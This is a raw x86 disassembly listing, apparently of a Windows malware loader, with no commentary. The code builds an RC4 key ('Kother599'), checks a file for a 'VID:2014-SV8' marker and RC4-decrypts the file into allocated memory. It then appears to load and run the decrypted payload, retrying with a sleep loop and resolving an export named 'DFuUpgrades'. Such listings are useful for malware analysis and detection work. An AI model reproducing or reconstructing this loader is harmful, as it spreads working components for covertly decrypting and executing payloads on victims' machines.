  401c89:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401c8d:	f3 ab                	rep stos %eax,%es:(%edi)
  401c8f:	8b 8c 24 14 04 00 00 	mov    0x414(%esp),%ecx
  401c96:	8d 7c 24 10          	lea    0x10(%esp),%edi
  401c9a:	8b c3                	mov    %ebx,%eax
  401c9c:	33 d2                	xor    %edx,%edx
  401c9e:	f7 b4 24 1c 04 00 00 	divl   0x41c(%esp)
  401ca5:	8b ac 24 18 04 00 00 	mov    0x418(%esp),%ebp
  401cac:	33 c0                	xor    %eax,%eax
  401cae:	88 1c 0b             	mov    %bl,(%ebx,%ecx,1)
  401cb1:	43                   	inc    %ebx
  401cb2:	83 c7 04             	add    $0x4,%edi
  401cb5:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  401cbb:	8a 04 2a             	mov    (%edx,%ebp,1),%al
  401cbe:	89 47 fc             	mov    %eax,-0x4(%edi)
  401cc1:	7c d7                	jl     0x401c9a
  401cc3:	33 c0                	xor    %eax,%eax
  401cc5:	8d 7c 24 10          	lea    0x10(%esp),%edi
  401cc9:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  401ccc:	8b 2f                	mov    (%edi),%ebp
  401cce:	8b da                	mov    %edx,%ebx
  401cd0:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401cd6:	03 dd                	add    %ebp,%ebx
  401cd8:	03 f3                	add    %ebx,%esi
  401cda:	81 e6 ff 00 00 80    	and    $0x800000ff,%esi
  401ce0:	79 08                	jns    0x401cea
  401ce2:	4e                   	dec    %esi
  401ce3:	81 ce 00 ff ff ff    	or     $0xffffff00,%esi
  401ce9:	46                   	inc    %esi
  401cea:	8a 1c 0e             	mov    (%esi,%ecx,1),%bl
  401ced:	83 c7 04             	add    $0x4,%edi
  401cf0:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
  401cf3:	40                   	inc    %eax
  401cf4:	3d 00 01 00 00       	cmp    $0x100,%eax
  401cf9:	88 14 0e             	mov    %dl,(%esi,%ecx,1)
  401cfc:	7c cb                	jl     0x401cc9
  401cfe:	5f                   	pop    %edi
  401cff:	5e                   	pop    %esi
  401d00:	5d                   	pop    %ebp
  401d01:	5b                   	pop    %ebx
  401d02:	81 c4 00 04 00 00    	add    $0x400,%esp
  401d08:	c3                   	ret
  401d09:	90                   	nop
  401d0a:	90                   	nop
  401d0b:	90                   	nop
  401d0c:	90                   	nop
  401d0d:	90                   	nop
  401d0e:	90                   	nop
  401d0f:	90                   	nop
  401d10:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401d14:	56                   	push   %esi
  401d15:	57                   	push   %edi
  401d16:	33 c9                	xor    %ecx,%ecx
  401d18:	33 f6                	xor    %esi,%esi
  401d1a:	33 ff                	xor    %edi,%edi
  401d1c:	85 c0                	test   %eax,%eax
  401d1e:	76 7c                	jbe    0x401d9c
  401d20:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401d24:	53                   	push   %ebx
  401d25:	55                   	push   %ebp
  401d26:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401d2a:	41                   	inc    %ecx
  401d2b:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
  401d31:	79 08                	jns    0x401d3b
  401d33:	49                   	dec    %ecx
  401d34:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  401d3a:	41                   	inc    %ecx
  401d3b:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  401d3e:	8b da                	mov    %edx,%ebx
  401d40:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401d46:	03 f3                	add    %ebx,%esi
  401d48:	81 e6 ff 00 00 80    	and    $0x800000ff,%esi
  401d4e:	79 08                	jns    0x401d58
  401d50:	4e                   	dec    %esi
  401d51:	81 ce 00 ff ff ff    	or     $0xffffff00,%esi
  401d57:	46                   	inc    %esi
  401d58:	8a 1c 06             	mov    (%esi,%eax,1),%bl
  401d5b:	88 54 24 18          	mov    %dl,0x18(%esp)
  401d5f:	88 1c 01             	mov    %bl,(%ecx,%eax,1)
  401d62:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  401d66:	88 14 06             	mov    %dl,(%esi,%eax,1)
  401d69:	33 d2                	xor    %edx,%edx
  401d6b:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  401d6e:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401d74:	03 d3                	add    %ebx,%edx
  401d76:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  401d7c:	79 08                	jns    0x401d86
  401d7e:	4a                   	dec    %edx
  401d7f:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  401d85:	42                   	inc    %edx
  401d86:	8a 14 02             	mov    (%edx,%eax,1),%dl
  401d89:	8a 1c 2f             	mov    (%edi,%ebp,1),%bl
  401d8c:	32 da                	xor    %dl,%bl
  401d8e:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401d92:	88 1c 2f             	mov    %bl,(%edi,%ebp,1)
  401d95:	47                   	inc    %edi
  401d96:	3b fa                	cmp    %edx,%edi
  401d98:	72 90                	jb     0x401d2a
  401d9a:	5d                   	pop    %ebp
  401d9b:	5b                   	pop    %ebx
  401d9c:	5f                   	pop    %edi
  401d9d:	5e                   	pop    %esi
  401d9e:	c3                   	ret
  401d9f:	90                   	nop
  401da0:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  401da6:	b0 39                	mov    $0x39,%al
  401da8:	6a 0a                	push   $0xa
  401daa:	88 44 24 0b          	mov    %al,0xb(%esp)
  401dae:	88 44 24 0c          	mov    %al,0xc(%esp)
  401db2:	8d 44 24 04          	lea    0x4(%esp),%eax
  401db6:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401dba:	50                   	push   %eax
  401dbb:	51                   	push   %ecx
  401dbc:	c6 44 24 0c 4b       	movb   $0x4b,0xc(%esp)
  401dc1:	c6 44 24 0d 6f       	movb   $0x6f,0xd(%esp)
  401dc6:	c6 44 24 0e 74       	movb   $0x74,0xe(%esp)
  401dcb:	c6 44 24 0f 68       	movb   $0x68,0xf(%esp)
  401dd0:	c6 44 24 10 65       	movb   $0x65,0x10(%esp)
  401dd5:	c6 44 24 11 72       	movb   $0x72,0x11(%esp)
  401dda:	c6 44 24 12 35       	movb   $0x35,0x12(%esp)
  401ddf:	c6 44 24 15 00       	movb   $0x0,0x15(%esp)
  401de4:	e8 87 fe ff ff       	call   0x401c70
  401de9:	8b 94 24 20 01 00 00 	mov    0x120(%esp),%edx
  401df0:	8b 84 24 1c 01 00 00 	mov    0x11c(%esp),%eax
  401df7:	52                   	push   %edx
  401df8:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401dfc:	50                   	push   %eax
  401dfd:	51                   	push   %ecx
  401dfe:	e8 0d ff ff ff       	call   0x401d10
  401e03:	81 c4 24 01 00 00    	add    $0x124,%esp
  401e09:	c3                   	ret
  401e0a:	90                   	nop
  401e0b:	90                   	nop
  401e0c:	90                   	nop
  401e0d:	90                   	nop
  401e0e:	90                   	nop
  401e0f:	90                   	nop
  401e10:	83 ec 30             	sub    $0x30,%esp
  401e13:	53                   	push   %ebx
  401e14:	55                   	push   %ebp
  401e15:	56                   	push   %esi
  401e16:	57                   	push   %edi
  401e17:	b3 53                	mov    $0x53,%bl
  401e19:	8b 44 24 44          	mov    0x44(%esp),%eax
  401e1d:	c7 44 24 10 e8 03 00 	movl   $0x3e8,0x10(%esp)
  401e24:	00 
  401e25:	50                   	push   %eax
  401e26:	e8 55 fd ff ff       	call   0x401b80
  401e2b:	83 c4 04             	add    $0x4,%esp
  401e2e:	85 c0                	test   %eax,%eax
  401e30:	0f 84 3f 01 00 00    	je     0x401f75
  401e36:	6a 00                	push   $0x0
  401e38:	6a 00                	push   $0x0
  401e3a:	6a 03                	push   $0x3
  401e3c:	6a 00                	push   $0x0
  401e3e:	6a 01                	push   $0x1
  401e40:	68 00 00 00 80       	push   $0x80000000
  401e45:	68 c0 44 40 00       	push   $0x4044c0
  401e4a:	ff 15 00 30 40 00    	call   *0x403000
  401e50:	8b f0                	mov    %eax,%esi
  401e52:	83 fe ff             	cmp    $0xffffffff,%esi
  401e55:	0f 84 1a 01 00 00    	je     0x401f75
  401e5b:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401e5f:	88 5c 24 18          	mov    %bl,0x18(%esp)
  401e63:	51                   	push   %ecx
  401e64:	56                   	push   %esi
  401e65:	88 5c 24 21          	mov    %bl,0x21(%esp)
  401e69:	88 5c 24 22          	mov    %bl,0x22(%esp)
  401e6d:	88 5c 24 23          	mov    %bl,0x23(%esp)
  401e71:	88 5c 24 24          	mov    %bl,0x24(%esp)
  401e75:	88 5c 24 25          	mov    %bl,0x25(%esp)
  401e79:	c6 44 24 26 00       	movb   $0x0,0x26(%esp)
  401e7e:	c6 44 24 28 56       	movb   $0x56,0x28(%esp)
  401e83:	c6 44 24 29 49       	movb   $0x49,0x29(%esp)
  401e88:	c6 44 24 2a 44       	movb   $0x44,0x2a(%esp)
  401e8d:	c6 44 24 2b 3a       	movb   $0x3a,0x2b(%esp)
  401e92:	c6 44 24 2c 32       	movb   $0x32,0x2c(%esp)
  401e97:	c6 44 24 2d 30       	movb   $0x30,0x2d(%esp)
  401e9c:	c6 44 24 2e 31       	movb   $0x31,0x2e(%esp)
  401ea1:	c6 44 24 2f 34       	movb   $0x34,0x2f(%esp)
  401ea6:	c6 44 24 30 2d       	movb   $0x2d,0x30(%esp)
  401eab:	88 5c 24 31          	mov    %bl,0x31(%esp)
  401eaf:	c6 44 24 32 56       	movb   $0x56,0x32(%esp)
  401eb4:	c6 44 24 33 38       	movb   $0x38,0x33(%esp)
  401eb9:	c6 44 24 34 00       	movb   $0x0,0x34(%esp)
  401ebe:	e8 cd fb ff ff       	call   0x401a90
  401ec3:	83 c4 08             	add    $0x8,%esp
  401ec6:	8b f8                	mov    %eax,%edi
  401ec8:	56                   	push   %esi
  401ec9:	ff 15 08 30 40 00    	call   *0x403008
  401ecf:	85 ff                	test   %edi,%edi
  401ed1:	0f 84 9e 00 00 00    	je     0x401f75
  401ed7:	8d 74 24 20          	lea    0x20(%esp),%esi
  401edb:	8d 47 06             	lea    0x6(%edi),%eax
  401ede:	8a 10                	mov    (%eax),%dl
  401ee0:	8a ca                	mov    %dl,%cl
  401ee2:	3a 16                	cmp    (%esi),%dl
  401ee4:	75 1c                	jne    0x401f02
  401ee6:	84 c9                	test   %cl,%cl
  401ee8:	74 14                	je     0x401efe
  401eea:	8a 50 01             	mov    0x1(%eax),%dl
  401eed:	8a ca                	mov    %dl,%cl
  401eef:	3a 56 01             	cmp    0x1(%esi),%dl
  401ef2:	75 0e                	jne    0x401f02
  401ef4:	83 c0 02             	add    $0x2,%eax
  401ef7:	83 c6 02             	add    $0x2,%esi
  401efa:	84 c9                	test   %cl,%cl
  401efc:	75 e0                	jne    0x401ede
  401efe:	33 c0                	xor    %eax,%eax
  401f00:	eb 05                	jmp    0x401f07
  401f02:	1b c0                	sbb    %eax,%eax
  401f04:	83 d8 ff             	sbb    $0xffffffff,%eax
  401f07:	85 c0                	test   %eax,%eax
  401f09:	75 6a                	jne    0x401f75
  401f0b:	50                   	push   %eax
  401f0c:	68 80 00 00 00       	push   $0x80
  401f11:	6a 03                	push   $0x3
  401f13:	50                   	push   %eax
  401f14:	50                   	push   %eax
  401f15:	68 00 00 00 80       	push   $0x80000000
  401f1a:	68 c0 44 40 00       	push   $0x4044c0
  401f1f:	ff 15 00 30 40 00    	call   *0x403000
  401f25:	8b f0                	mov    %eax,%esi
  401f27:	85 f6                	test   %esi,%esi
  401f29:	74 4a                	je     0x401f75
  401f2b:	6a 00                	push   $0x0
  401f2d:	56                   	push   %esi
  401f2e:	ff 15 34 30 40 00    	call   *0x403034
  401f34:	8b f8                	mov    %eax,%edi
  401f36:	6a 04                	push   $0x4
  401f38:	68 00 30 00 00       	push   $0x3000
  401f3d:	57                   	push   %edi
  401f3e:	6a 00                	push   $0x0
  401f40:	ff 15 28 30 40 00    	call   *0x403028
  401f46:	8b e8                	mov    %eax,%ebp
  401f48:	8d 44 24 14          	lea    0x14(%esp),%eax
  401f4c:	6a 00                	push   $0x0
  401f4e:	50                   	push   %eax
  401f4f:	57                   	push   %edi
  401f50:	55                   	push   %ebp
  401f51:	56                   	push   %esi
  401f52:	ff 15 48 30 40 00    	call   *0x403048
  401f58:	56                   	push   %esi
  401f59:	ff 15 08 30 40 00    	call   *0x403008
  401f5f:	57                   	push   %edi
  401f60:	55                   	push   %ebp
  401f61:	e8 3a fe ff ff       	call   0x401da0
  401f66:	55                   	push   %ebp
  401f67:	e8 94 f0 ff ff       	call   0x401000
  401f6c:	8b f0                	mov    %eax,%esi
  401f6e:	83 c4 0c             	add    $0xc,%esp
  401f71:	85 f6                	test   %esi,%esi
  401f73:	75 2e                	jne    0x401fa3
  401f75:	68 c0 44 40 00       	push   $0x4044c0
  401f7a:	68 30 40 40 00       	push   $0x404030
  401f7f:	e8 3c f9 ff ff       	call   0x4018c0
  401f84:	83 c4 08             	add    $0x8,%esp
  401f87:	85 c0                	test   %eax,%eax
  401f89:	74 08                	je     0x401f93
  401f8b:	c7 44 24 10 14 00 00 	movl   $0x14,0x10(%esp)
  401f92:	00 
  401f93:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401f97:	51                   	push   %ecx
  401f98:	ff 15 3c 30 40 00    	call   *0x40303c
  401f9e:	e9 76 fe ff ff       	jmp    0x401e19
  401fa3:	b0 6c                	mov    $0x6c,%al
  401fa5:	8d 54 24 30          	lea    0x30(%esp),%edx
  401fa9:	88 44 24 31          	mov    %al,0x31(%esp)
  401fad:	88 44 24 32          	mov    %al,0x32(%esp)
  401fb1:	b1 61                	mov    $0x61,%cl
  401fb3:	b0 72                	mov    $0x72,%al
  401fb5:	52                   	push   %edx
  401fb6:	56                   	push   %esi
  401fb7:	c6 44 24 28 43       	movb   $0x43,0x28(%esp)
  401fbc:	88 4c 24 29          	mov    %cl,0x29(%esp)
  401fc0:	c6 44 24 2a 6f       	movb   $0x6f,0x2a(%esp)
  401fc5:	c6 44 24 2b 33       	movb   $0x33,0x2b(%esp)
  401fca:	c6 44 24 2c 36       	movb   $0x36,0x2c(%esp)
  401fcf:	c6 44 24 2d 30       	movb   $0x30,0x2d(%esp)
  401fd4:	c6 44 24 2e 79       	movb   $0x79,0x2e(%esp)
  401fd9:	c6 44 24 2f 6e       	movb   $0x6e,0x2f(%esp)
  401fde:	c6 44 24 30 69       	movb   $0x69,0x30(%esp)
  401fe3:	c6 44 24 31 00       	movb   $0x0,0x31(%esp)
  401fe8:	c6 44 24 38 44       	movb   $0x44,0x38(%esp)
  401fed:	c6 44 24 3b 46       	movb   $0x46,0x3b(%esp)
  401ff2:	c6 44 24 3c 75       	movb   $0x75,0x3c(%esp)
  401ff7:	c6 44 24 3d 55       	movb   $0x55,0x3d(%esp)
  401ffc:	c6 44 24 3e 70       	movb   $0x70,0x3e(%esp)
  402001:	c6 44 24 3f 67       	movb   $0x67,0x3f(%esp)
  402006:	88 44 24 40          	mov    %al,0x40(%esp)
  40200a:	88 4c 24 41          	mov    %cl,0x41(%esp)
  40200e:	c6 44 24 42 64       	movb   $0x64,0x42(%esp)
  402013:	88 44 24 43          	mov    %al,0x43(%esp)
  402017:	c6 44 24 44 73       	movb   $0x73,0x44(%esp)
  40201c:	c6 44 24 45 00       	movb   $0x0,0x45(%esp)
  402021:	e8 4a f4 ff ff       	call   0x401470
  402026:	83 c4 08             	add    $0x8,%esp
  402029:	85 c0                	test   %eax,%eax
  40202b:	74 0f                	je     0x40203c
  40202d:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402031:	51                   	push   %ecx
  402032:	68 b0 40 40 00       	push   $0x4040b0
  402037:	ff d0                	call   *%eax
  402039:	83 c4 08             	add    $0x8,%esp
  40203c:	56                   	push   %esi
  40203d:	e8 ee f4 ff ff       	call   0x401530
  402042:	83 c4 04             	add    $0x4,%esp
  402045:	5f                   	pop    %edi
  402046:	5e                   	pop    %esi
  402047:	5d                   	pop    %ebp
  402048:	5b                   	pop    %ebx
  402049:	83 c4 30             	add    $0x30,%esp
  40204c:	c3                   	ret
  40204d:	90                   	nop
  40204e:	90                   	nop
  40204f:	90                   	nop
  402050:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402056:	57                   	push   %edi
  402057:	b9 40 00 00 00       	mov    $0x40,%ecx
  40205c:	33 c0                	xor    %eax,%eax
  40205e:	8d 7c 24 0d          	lea    0xd(%esp),%edi
  402062:	c6 44 24 0c 00       	movb   $0x0,0xc(%esp)
  402067:	68 30 40 40 00       	push   $0x404030
  40206c:	f3 ab                	rep stos %eax,%es:(%edi)
  40206e:	66 ab                	stos   %ax,%es:(%edi)
  402070:	aa                   	stos   %al,%es:(%edi)
  402071:	e8 8a 01 00 00       	call   0x402200
  402076:	83 c4 04             	add    $0x4,%esp
  402079:	8b d0                	mov    %eax,%edx
  40207b:	85 c0                	test   %eax,%eax
  40207d:	7e 34                	jle    0x4020b3
  40207f:	b1 2f                	mov    $0x2f,%cl
  402081:	38 8a 30 40 40 00    	cmp    %cl,0x404030(%edx)
  402087:	74 07                	je     0x402090
  402089:	4a                   	dec    %edx
  40208a:	85 d2                	test   %edx,%edx
  40208c:	7f f3                	jg     0x402081
  40208e:	eb 23                	jmp    0x4020b3
  402090:	42                   	inc    %edx
  402091:	8b c8                	mov    %eax,%ecx
  402093:	2b ca                	sub    %edx,%ecx
  402095:	85 c9                	test   %ecx,%ecx
  402097:	7e 1a                	jle    0x4020b3
  402099:	8b c1                	mov    %ecx,%eax
  40209b:	56                   	push   %esi
  40209c:	8d b2 30 40 40 00    	lea    0x404030(%edx),%esi
  4020a2:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4020a6:	c1 e9 02             	shr    $0x2,%ecx
  4020a9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4020ab:	8b c8                	mov    %eax,%ecx
  4020ad:	83 e1 03             	and    $0x3,%ecx
  4020b0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4020b2:	5e                   	pop    %esi
  4020b3:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4020b7:	51                   	push   %ecx
  4020b8:	e8 43 01 00 00       	call   0x402200
  4020bd:	83 c4 04             	add    $0x4,%esp
  4020c0:	85 c0                	test   %eax,%eax
  4020c2:	5f                   	pop    %edi
  4020c3:	7e 4d                	jle    0x402112
  4020c5:	b1 2e                	mov    $0x2e,%cl
  4020c7:	38 4c 04 08          	cmp    %cl,0x8(%esp,%eax,1)
  4020cb:	74 16                	je     0x4020e3
  4020cd:	48                   	dec    %eax
  4020ce:	85 c0                	test   %eax,%eax
  4020d0:	7f f5                	jg     0x4020c7
  4020d2:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4020d6:	51                   	push   %ecx
  4020d7:	e8 34 fd ff ff       	call   0x401e10
  4020dc:	81 c4 10 01 00 00    	add    $0x110,%esp
  4020e2:	c3                   	ret
  4020e3:	c6 44 04 08 00       	movb   $0x0,0x8(%esp,%eax,1)
  4020e8:	b0 6c                	mov    $0x6c,%al
  4020ea:	88 44 24 02          	mov    %al,0x2(%esp)
  4020ee:	88 44 24 03          	mov    %al,0x3(%esp)
  4020f2:	8d 54 24 00          	lea    0x0(%esp),%edx
  4020f6:	8d 44 24 08          	lea    0x8(%esp),%eax
  4020fa:	52                   	push   %edx
  4020fb:	50                   	push   %eax
  4020fc:	88 4c 24 08          	mov    %cl,0x8(%esp)
  402100:	c6 44 24 09 64       	movb   $0x64,0x9(%esp)
  402105:	c6 44 24 0c 00       	movb   $0x0,0xc(%esp)
  40210a:	e8 c1 00 00 00       	call   0x4021d0
  40210f:	83 c4 08             	add    $0x8,%esp
  402112:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402116:	51                   	push   %ecx
  402117:	e8 f4 fc ff ff       	call   0x401e10
  40211c:	81 c4 10 01 00 00    	add    $0x110,%esp
  402122:	c3                   	ret
  402123:	90                   	nop
  402124:	90                   	nop
  402125:	90                   	nop
  402126:	90                   	nop
  402127:	90                   	nop
  402128:	90                   	nop
  402129:	90                   	nop
  40212a:	90                   	nop
  40212b:	90                   	nop
  40212c:	90                   	nop
  40212d:	90                   	nop
  40212e:	90                   	nop
  40212f:	90                   	nop
  402130:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402134:	53                   	push   %ebx
  402135:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402139:	56                   	push   %esi
  40213a:	8b d1                	mov    %ecx,%edx
  40213c:	57                   	push   %edi
  40213d:	8b 74 24 14          	mov    0x14(%esp),%esi
  402141:	33 c0                	xor    %eax,%eax
  402143:	8b fb                	mov    %ebx,%edi
  402145:	56                   	push   %esi
  402146:	c1 e9 02             	shr    $0x2,%ecx
  402149:	f3 ab                	rep stos %eax,%es:(%edi)
  40214b:	8b ca                	mov    %edx,%ecx
  40214d:	83 e1 03             	and    $0x3,%ecx
  402150:	f3 aa                	rep stos %al,%es:(%edi)
  402152:	e8 a9 00 00 00       	call   0x402200
  402157:	8b c8                	mov    %eax,%ecx
  402159:	8b fb                	mov    %ebx,%edi
  40215b:	c1 e9 02             	shr    $0x2,%ecx
  40215e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402160:	8b c8                	mov    %eax,%ecx
  402162:	83 c4 04             	add    $0x4,%esp
  402165:	83 e1 03             	and    $0x3,%ecx
  402168:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40216a:	5f                   	pop    %edi
  40216b:	5e                   	pop    %esi
  40216c:	5b                   	pop    %ebx
  40216d:	c3                   	ret
  40216e:	90                   	nop
  40216f:	90                   	nop
  402170:	56                   	push   %esi
  402171:	8b 74 24 08          	mov    0x8(%esp),%esi
  402175:	57                   	push   %edi
  402176:	56                   	push   %esi
  402177:	e8 84 00 00 00       	call   0x402200
  40217c:	8b f8                	mov    %eax,%edi
  40217e:	83 c4 04             	add    $0x4,%esp
  402181:	83 ff 10             	cmp    $0x10,%edi
  402184:	73 05                	jae    0x40218b
  402186:	5f                   	pop    %edi
  402187:	33 c0                	xor    %eax,%eax
  402189:	5e                   	pop    %esi
  40218a:	c3                   	ret
  40218b:	56                   	push   %esi
  40218c:	e8 cf f6 ff ff       	call   0x401860
  402191:	8b f0                	mov    %eax,%esi
  402193:	57                   	push   %edi
  402194:	56                   	push   %esi
  402195:	68 30 40 40 00       	push   $0x404030
  40219a:	e8 91 ff ff ff       	call   0x402130
  40219f:	56                   	push   %esi
  4021a0:	e8 91 00 00 00       	call   0x402236
  4021a5:	83 c4 14             	add    $0x14,%esp
  4021a8:	b8 01 00 00 00       	mov    $0x1,%eax
  4021ad:	5f                   	pop    %edi
  4021ae:	5e                   	pop    %esi
  4021af:	c3                   	ret
  4021b0:	68 30 40 40 00       	push   $0x404030
  4021b5:	e8 b6 ff ff ff       	call   0x402170
  4021ba:	83 c4 04             	add    $0x4,%esp
  4021bd:	85 c0                	test   %eax,%eax
  4021bf:	74 0a                	je     0x4021cb
  4021c1:	e8 5a 00 00 00       	call   0x402220
  4021c6:	e8 85 fe ff ff       	call   0x402050
  4021cb:	33 c0                	xor    %eax,%eax
  4021cd:	c2 10 00             	ret    $0x10
  4021d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021d4:	8b c8                	mov    %eax,%ecx
  4021d6:	80 38 00             	cmpb   $0x0,(%eax)
  4021d9:	74 08                	je     0x4021e3
  4021db:	8a 51 01             	mov    0x1(%ecx),%dl
  4021de:	41                   	inc    %ecx
  4021df:	84 d2                	test   %dl,%dl
  4021e1:	75 f8                	jne    0x4021db
  4021e3:	56                   	push   %esi
  4021e4:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4021e8:	41                   	inc    %ecx
  4021e9:	8a 16                	mov    (%esi),%dl
  4021eb:	46                   	inc    %esi
  4021ec:	88 51 ff             	mov    %dl,-0x1(%ecx)
  4021ef:	84 d2                	test   %dl,%dl
  4021f1:	74 0a                	je     0x4021fd
  4021f3:	8a 16                	mov    (%esi),%dl
  4021f5:	88 11                	mov    %dl,(%ecx)
  4021f7:	41                   	inc    %ecx
  4021f8:	46                   	inc    %esi
  4021f9:	84 d2                	test   %dl,%dl
  4021fb:	75 f6                	jne    0x4021f3
  4021fd:	5e                   	pop    %esi
  4021fe:	c3                   	ret
  4021ff:	90                   	nop
  402200:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402204:	85 c9                	test   %ecx,%ecx
  402206:	75 03                	jne    0x40220b
  402208:	33 c0                	xor    %eax,%eax
  40220a:	c3                   	ret
  40220b:	8a 11                	mov    (%ecx),%dl
  40220d:	33 c0                	xor    %eax,%eax
  40220f:	41                   	inc    %ecx
  402210:	84 d2                	test   %dl,%dl
  402212:	74 08                	je     0x40221c
  402214:	8a 11                	mov    (%ecx),%dl
  402216:	40                   	inc    %eax
  402217:	41                   	inc    %ecx
  402218:	84 d2                	test   %dl,%dl
  40221a:	75 f8                	jne    0x402214
  40221c:	c3                   	ret
  40221d:	90                   	nop
  40221e:	90                   	nop
  40221f:	90                   	nop
  402220:	c3                   	ret
  402221:	90                   	nop
  402222:	90                   	nop
  402223:	90                   	nop
  402224:	90                   	nop
  402225:	90                   	nop
  402226:	90                   	nop
  402227:	90                   	nop
  402228:	90                   	nop
  402229:	90                   	nop
  40222a:	90                   	nop
  40222b:	90                   	nop
  40222c:	90                   	nop
  40222d:	90                   	nop
  40222e:	90                   	nop
  40222f:	90                   	nop
  402230:	ff 25 98 30 40 00    	jmp    *0x403098
  402236:	ff 25 94 30 40 00    	jmp    *0x403094
  40223c:	ff 25 90 30 40 00    	jmp    *0x403090
  402242:	ff 25 8c 30 40 00    	jmp    *0x40308c
  402248:	ff 25 88 30 40 00    	jmp    *0x403088
  40224e:	55                   	push   %ebp
  40224f:	8b ec                	mov    %esp,%ebp
  402251:	6a ff                	push   $0xffffffff
  402253:	68 c0 30 40 00       	push   $0x4030c0
  402258:	68 d0 23 40 00       	push   $0x4023d0
  40225d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402263:	50                   	push   %eax
  402264:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40226b:	83 ec 68             	sub    $0x68,%esp
  40226e:	53                   	push   %ebx
  40226f:	56                   	push   %esi
  402270:	57                   	push   %edi
  402271:	89 65 e8             	mov    %esp,-0x18(%ebp)
  402274:	33 db                	xor    %ebx,%ebx
  402276:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402279:	6a 02                	push   $0x2
  40227b:	ff 15 5c 30 40 00    	call   *0x40305c
  402281:	59                   	pop    %ecx
  402282:	83 0d d4 45 40 00 ff 	orl    $0xffffffff,0x4045d4
  402289:	83 0d d8 45 40 00 ff 	orl    $0xffffffff,0x4045d8
  402290:	ff 15 60 30 40 00    	call   *0x403060
  402296:	8b 0d d0 45 40 00    	mov    0x4045d0,%ecx
  40229c:	89 08                	mov    %ecx,(%eax)
  40229e:	ff 15 64 30 40 00    	call   *0x403064
  4022a4:	8b 0d cc 45 40 00    	mov    0x4045cc,%ecx
  4022aa:	89 08                	mov    %ecx,(%eax)
  4022ac:	a1 68 30 40 00       	mov    0x403068,%eax
  4022b1:	8b 00                	mov    (%eax),%eax
  4022b3:	a3 dc 45 40 00       	mov    %eax,0x4045dc
  4022b8:	e8 10 01 00 00       	call   0x4023cd
  4022bd:	39 1d b0 44 40 00    	cmp    %ebx,0x4044b0
  4022c3:	75 0c                	jne    0x4022d1
  4022c5:	68 ca 23 40 00       	push   $0x4023ca
  4022ca:	ff 15 6c 30 40 00    	call   *0x40306c
  4022d0:	59                   	pop    %ecx
  4022d1:	e8 e2 00 00 00       	call   0x4023b8
  4022d6:	68 0c 40 40 00       	push   $0x40400c
  4022db:	68 08 40 40 00       	push   $0x404008
  4022e0:	e8 cd 00 00 00       	call   0x4023b2
  4022e5:	a1 c8 45 40 00       	mov    0x4045c8,%eax
  4022ea:	89 45 94             	mov    %eax,-0x6c(%ebp)
  4022ed:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4022f0:	50                   	push   %eax
  4022f1:	ff 35 c4 45 40 00    	push   0x4045c4
  4022f7:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4022fa:	50                   	push   %eax
  4022fb:	8d 45 90             	lea    -0x70(%ebp),%eax
  4022fe:	50                   	push   %eax
  4022ff:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402302:	50                   	push   %eax
  402303:	ff 15 74 30 40 00    	call   *0x403074
  402309:	68 04 40 40 00       	push   $0x404004
  40230e:	68 00 40 40 00       	push   $0x404000
  402313:	e8 9a 00 00 00       	call   0x4023b2
  402318:	83 c4 24             	add    $0x24,%esp
  40231b:	a1 78 30 40 00       	mov    0x403078,%eax
  402320:	8b 30                	mov    (%eax),%esi
  402322:	89 75 8c             	mov    %esi,-0x74(%ebp)
  402325:	80 3e 22             	cmpb   $0x22,(%esi)
  402328:	75 3a                	jne    0x402364
  40232a:	46                   	inc    %esi
  40232b:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40232e:	8a 06                	mov    (%esi),%al
  402330:	3a c3                	cmp    %bl,%al
  402332:	74 04                	je     0x402338
  402334:	3c 22                	cmp    $0x22,%al
  402336:	75 f2                	jne    0x40232a
  402338:	80 3e 22             	cmpb   $0x22,(%esi)
  40233b:	75 04                	jne    0x402341
  40233d:	46                   	inc    %esi
  40233e:	89 75 8c             	mov    %esi,-0x74(%ebp)
  402341:	8a 06                	mov    (%esi),%al
  402343:	3a c3                	cmp    %bl,%al
  402345:	74 04                	je     0x40234b
  402347:	3c 20                	cmp    $0x20,%al
  402349:	76 f2                	jbe    0x40233d
